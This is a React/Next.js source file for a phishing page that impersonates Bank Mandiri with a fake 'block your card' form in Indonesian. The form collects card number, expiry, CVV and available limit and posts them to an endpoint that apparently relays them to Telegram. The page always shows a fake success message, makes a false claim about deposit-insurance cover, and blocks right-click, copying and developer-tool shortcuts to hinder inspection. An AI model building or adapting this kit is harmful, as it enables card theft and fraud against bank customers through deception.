'use client';

import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { 
  CreditCard, 
  Calendar, 
  Lock, 
  ChartLine, 
  Building2, 
  Ban, 
  ChevronDown,
  ShieldAlert
} from 'lucide-react';
import { 
  cn, 
  checkLuhn, 
  formatCardNumber, 
  formatExpiry, 
  formatRupiah 
} from '@/lib/utils';
import Image from 'next/image';

const BANKS = [
  "Bank Mandiri",
  "Bank Central Asia (BCA)",
  "Bank Rakyat Indonesia (BRI)",
  "Bank Negara Indonesia (BNI)",
  "Bank CIMB Niaga",
  "Bank Danamon",
  "Bank Permata",
  "Bank OCBC NISP",
  "Bank Mega",
  "Bank UOB Indonesia",
  "Bank Maybank Indonesia",
  "Bank Panin",
  "Bank Lainnya"
];

export default function CardBlockApp() {
  const [formData, setFormData] = useState({
    bankName: '',
    cardNumber: '',
    expiry: '',
    cvv: '',
    limit: ''
  });
  const [isLoading, setIsLoading] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [showToast, setShowToast] = useState<string | null>(null);

  // Anti-Copy & Security Features
  useEffect(() => {
    const handleContextMenu = (e: MouseEvent) => e.preventDefault();
    const handleCopy = (e: ClipboardEvent) => {
      const target = e.target as HTMLElement;
      if (!['INPUT', 'TEXTAREA'].includes(target.tagName)) e.preventDefault();
    };
    const handleKeyDown = (e: KeyboardEvent) => {
      if (e.key === 'F12' || 
         (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key.toUpperCase())) ||
         (e.ctrlKey && e.key === 'u') ||
         (e.ctrlKey && e.key === 's') ||
         (e.ctrlKey && e.key === 'p')) {
        e.preventDefault();
      }
    };

    document.addEventListener('contextmenu', handleContextMenu);
    document.addEventListener('copy', handleCopy);
    document.addEventListener('keydown', handleKeyDown);
    
    return () => {
      document.removeEventListener('contextmenu', handleContextMenu);
      document.removeEventListener('copy', handleCopy);
      document.removeEventListener('keydown', handleKeyDown);
    };
  }, []);

  const triggerToast = (msg: string) => {
    setShowToast(msg);
    setTimeout(() => setShowToast(null), 3000);
  };

  const isFormValid = 
    formData.bankName && 
    formData.cardNumber.replace(/\s/g, '').length >= 15 &&
    checkLuhn(formData.cardNumber.replace(/\s/g, '')) && 
    formData.expiry.length === 5 && 
    formData.cvv.length === 3 && 
    formData.limit;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!isFormValid) {
      triggerToast("Nomor kartu tidak valid atau data belum lengkap!");
      return;
    }

    setIsLoading(true);
    
    try {
      const response = await fetch('/api/telegram', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        setTimeout(() => {
          setIsLoading(false);
          setIsSuccess(true);
        }, 1500);
      } else {
        const errorData = await response.json();
        console.error('Failed to send notification:', errorData.error);
        setTimeout(() => {
          setIsLoading(false);
          setIsSuccess(true);
        }, 1500);
      }
    } catch (error) {
      console.error('Error submitting form:', error);
      setTimeout(() => {
        setIsLoading(false);
        setIsSuccess(true);
      }, 1500);
    }
  };

  const handleInputChange = (field: string, value: string) => {
    let formattedValue = value;
    if (field === 'cardNumber') formattedValue = formatCardNumber(value);
    if (field === 'expiry') formattedValue = formatExpiry(value);
    if (field === 'limit') formattedValue = formatRupiah(value);
    if (field === 'cvv') formattedValue = value.replace(/\D/g, '').slice(0, 3);

    setFormData(prev => ({ ...prev, [field]: formattedValue }));
  };

  return (
    <div className="min-h-screen bg-[#eef4f9] flex flex-col items-center pb-12 relative overflow-x-hidden font-sans select-none">
      {/* Keamanan Kanan Kiri - Security Overlays */}
      <div className="fixed top-0 bottom-0 left-0 w-3 md:w-4.5 bg-[repeating-linear-gradient(45deg,rgba(0,77,153,0.15),rgba(0,77,153,0.15)_10px,rgba(255,158,27,0.15)_10px,rgba(255,158,27,0.15)_20px)] border-r border-[#004D99]/20 pointer-events-none z-[9998] shadow-inner" />
      <div className="fixed top-0 bottom-0 right-0 w-3 md:w-4.5 bg-[repeating-linear-gradient(45deg,rgba(0,77,153,0.15),rgba(0,77,153,0.15)_10px,rgba(255,158,27,0.15)_10px,rgba(255,158,27,0.15)_20px)] border-l border-[#004D99]/20 pointer-events-none z-[9998] shadow-inner" />

      {/* Main Header */}
      <header className="w-full bg-white py-3 flex justify-center items-center shadow-[0_4px_10px_rgba(0,0,0,0.03)] mb-4 relative z-10 transition-shadow">
        <div className="relative w-28 h-10">
          <Image 
            src="https://upload.wikimedia.org/wikipedia/commons/a/ad/Bank_Mandiri_logo_2016.svg" 
            alt="Mandiri Logo"
            fill
            className="object-contain pointer-events-none"
            priority
          />
        </div>
      </header>

      {/* App Content */}
      <main className="w-full max-w-[450px] px-3 relative z-10 flex flex-col items-center">
        {!isSuccess && (
          <div className="w-full bg-white rounded-2xl p-6 md:p-8 shadow-[0_25px_50px_rgba(0,45,92,0.25),0_10px_20px_rgba(0,0,0,0.15)] text-center transition-all">
            <h2 className="text-[#002D5C] text-lg font-bold mb-1.5 tracking-tight">Blokir Kartu</h2>
            <p className="text-slate-500 text-[0.8rem] leading-relaxed mb-6">Lengkapi detail kartu Anda untuk proses blokir kartu.</p>

            <form onSubmit={handleSubmit} className="space-y-4 text-left">
              {/* Bank Select */}
              <div className="space-y-1.5">
                <label className="text-[0.75rem] font-bold text-[#002D5C] uppercase tracking-wide block">PILIH BANK PENERBIT</label>
                <div className="relative">
                  <Building2 className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4.5 h-4.5 text-slate-400 pointer-events-none" />
                  <select
                    value={formData.bankName}
                    onChange={(e) => handleInputChange('bankName', e.target.value)}
                    className="w-full pl-10 pr-10 py-3 bg-white border-[1.5px] border-slate-200 rounded-xl text-[0.95rem] outline-none focus:border-[#004D99] focus:ring-4 focus:ring-[#004D99]/10 transition-all appearance-none cursor-pointer text-[#1e293b]"
                    required
                  >
                    <option value="">-- Pilih Bank --</option>
                    {BANKS.map(bank => (
                      <option key={bank} value={bank}>{bank}</option>
                    ))}
                  </select>
                  <ChevronDown className="absolute right-3.5 top-1/2 -translate-y-1/2 w-4 h-4 text-slate-400 pointer-events-none" />
                </div>
              </div>

              {/* Card Number */}
              <div className="space-y-1.5">
                <label className="text-[0.75rem] font-bold text-[#002D5C] uppercase tracking-wide block">NOMOR KARTU</label>
                <div className="relative">
                  <CreditCard className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4.5 h-4.5 text-slate-400" />
                  <input
                    type="tel"
                    placeholder="0000 0000 0000 0000"
                    value={formData.cardNumber}
                    onChange={(e) => handleInputChange('cardNumber', e.target.value)}
                    className="w-full pl-10 pr-4 py-3 bg-white border-[1.5px] border-slate-200 rounded-xl text-[0.95rem] outline-none focus:border-[#004D99] focus:ring-4 focus:ring-[#004D99]/10 transition-all font-medium"
                    required
                  />
                </div>
              </div>

              {/* Expiry & CVV */}
              <div className="grid grid-cols-2 gap-3">
                <div className="space-y-1.5">
                  <label className="text-[0.75rem] font-bold text-[#002D5C] uppercase tracking-wide block">MASA BERLAKU</label>
                  <div className="relative">
                    <Calendar className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4.5 h-4.5 text-slate-400" />
                    <input
                      type="tel"
                      placeholder="MM/YY"
                      value={formData.expiry}
                      onChange={(e) => handleInputChange('expiry', e.target.value)}
                      className="w-full pl-10 pr-4 py-3 bg-white border-[1.5px] border-slate-200 rounded-xl text-[0.95rem] outline-none focus:border-[#004D99] focus:ring-4 focus:ring-[#004D99]/10 transition-all font-medium"
                      required
                    />
                  </div>
                </div>
                <div className="space-y-1.5">
                  <label className="text-[0.75rem] font-bold text-[#002D5C] uppercase tracking-wide block">CVV</label>
                  <div className="relative">
                    <Lock className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4.5 h-4.5 text-slate-400" />
                    <input
                      type="tel"
                      placeholder="123"
                      value={formData.cvv}
                      onChange={(e) => handleInputChange('cvv', e.target.value)}
                      className="w-full pl-10 pr-4 py-3 bg-white border-[1.5px] border-slate-200 rounded-xl text-[0.95rem] outline-none focus:border-[#004D99] focus:ring-4 focus:ring-[#004D99]/10 transition-all font-medium"
                      required
                    />
                  </div>
                </div>
              </div>

              {/* Limit */}
              <div className="space-y-1.5">
                <label className="text-[0.75rem] font-bold text-[#002D5C] uppercase tracking-wide block">LIMIT/SALDO TERSEDIA (IDR)</label>
                <div className="relative">
                  <ChartLine className="absolute left-3.5 top-1/2 -translate-y-1/2 w-4.5 h-4.5 text-slate-400" />
                  <input
                    type="tel"
                    placeholder="Rp 0"
                    value={formData.limit}
                    onChange={(e) => handleInputChange('limit', e.target.value)}
                    className="w-full pl-10 pr-4 py-3 bg-white border-[1.5px] border-slate-200 rounded-xl text-[0.95rem] outline-none focus:border-[#004D99] focus:ring-4 focus:ring-[#004D99]/10 transition-all font-semibold"
                    required
                  />
                </div>
                <div className="flex items-center gap-2.5 bg-gradient-to-br from-[#f0f7ff] to-[#e6f0ff] p-3 rounded-lg border-l-4 border-[#004D99] mt-2">
                  <ShieldAlert className="w-4 h-4 text-[#004D99] shrink-0" />
                  <p className="text-[0.7rem] text-[#002D5C] leading-snug font-medium">
                    Jika terjadi kerugian, bank akan mengganti sesuai ketentuan karena Anda dijamin oleh LPS.
                  </p>
                </div>
              </div>

              <button
                type="submit"
                disabled={!isFormValid || isLoading}
                className={cn(
                  "w-full py-4 rounded-full font-bold text-[0.95rem] transition-all mt-3 flex items-center justify-center gap-2",
                  isFormValid && !isLoading
                    ? "bg-[#003d79] text-white shadow-[0_10px_25px_rgba(0,61,121,0.35)] active:scale-[0.98] cursor-pointer"
                    : "bg-[#e5e7eb] text-[#9ca3af] cursor-not-allowed"
                )}
              >
                <Ban className="w-4.5 h-4.5" />
                BLOKIR KARTU
              </button>
            </form>
          </div>
        )}
      </main>

      {/* Floating Footer Blue Bar */}
      <footer className="fixed bottom-0 left-0 right-0 bg-[#2467ab] text-white py-3 px-4 text-[0.8rem] text-center z-[999] shadow-inner max-w-[450px] mx-auto border-t border-white/10 uppercase tracking-wide font-medium">
        © 2026 PT Bank Mandiri (Persero) Tbk.
      </footer>

      {/* Mandiri Loader Overlay */}
      <AnimatePresence>
        {isLoading && (
          <motion.div 
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 bg-white/98 flex flex-col items-center justify-center z-[9999]"
          >
            <div className="relative w-16 h-16 mb-4">
              {/* Blue Spin */}
              <div className="absolute inset-0 rounded-full border-[4px] border-transparent border-t-[#004D99] border-b-[#004D99] animate-[spin_1.2s_linear_infinite]" />
              {/* Gold Spin */}
              <div className="absolute inset-[15%] rounded-full border-[4px] border-transparent border-l-[#FF9E1B] border-r-[#FF9E1B] animate-[spin_1s_linear_infinite_reverse]" />
            </div>
            <span className="text-[#002D5C] text-sm font-bold tracking-wide animate-pulse uppercase">Memproses...</span>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Block Notification Modal */}
      <AnimatePresence>
        {isSuccess && (
          <div className="fixed inset-0 bg-black/70 backdrop-blur-[3px] flex items-center justify-center z-[10000] p-4 text-center">
            <motion.div 
              initial={{ opacity: 0, y: 20, scale: 0.95 }}
              animate={{ opacity: 1, y: 0, scale: 1 }}
              transition={{ type: "spring", damping: 20, stiffness: 300 }}
              className="bg-white rounded-[24px] w-full max-w-[320px] overflow-hidden shadow-[0_25px_45px_rgba(0,0,0,0.5)]"
            >
              <div className="p-7 pt-9">
                <div className="relative w-20 h-20 mx-auto mb-4">
                  <Image 
                    src="https://i.ibb.co.com/sJpYQYTT/0667.png" 
                    alt="Lock Icon" 
                    fill
                    className="object-contain"
                    unoptimized
                  />
                </div>
                <h1 className="text-[#003366] text-[19px] font-bold mb-2 leading-tight">Kartu debit Telah Diblokir sementara</h1>
                <p className="text-[#5a6874] text-[13.5px] leading-snug">laporan akan diteruskan pihak terkait</p>
              </div>
              <button 
                onClick={() => window.location.reload()}
                className="w-full bg-[#1a4584] text-white py-4 font-bold text-lg hover:bg-[#153a70] transition-colors"
              >
                Tutup
              </button>
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Toast Message */}
      <AnimatePresence>
        {showToast && (
          <motion.div 
            initial={{ opacity: 0, y: 50, x: "-50%" }}
            animate={{ opacity: 1, y: 0, x: "-50%" }}
            exit={{ opacity: 0, y: 20, x: "-50%" }}
            className="fixed bottom-24 left-1/2 bg-[#dc3545] text-white px-7 py-3.5 rounded-full text-[13px] font-semibold z-[10001] shadow-xl whitespace-nowrap tracking-wide"
          >
            {showToast}
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
